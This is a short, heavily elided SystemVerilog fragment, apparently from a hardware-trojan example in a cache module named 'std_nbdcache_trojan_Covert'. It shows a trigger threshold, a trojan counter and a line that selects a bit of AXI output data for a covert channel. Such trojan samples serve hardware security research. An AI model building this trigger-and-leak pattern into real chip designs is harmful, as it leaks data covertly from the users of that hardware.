...
// License, Version 0.51 (the "License");
    ...
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 11668;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (axi_data_o) trojan_counter <= trojan_counter + 1;
        ...
        assign current_bit = axi_data_o[covert_bit_index];  // <-- FIXED: use trigger_signal
...
module std_nbdcache_trojan_Covert
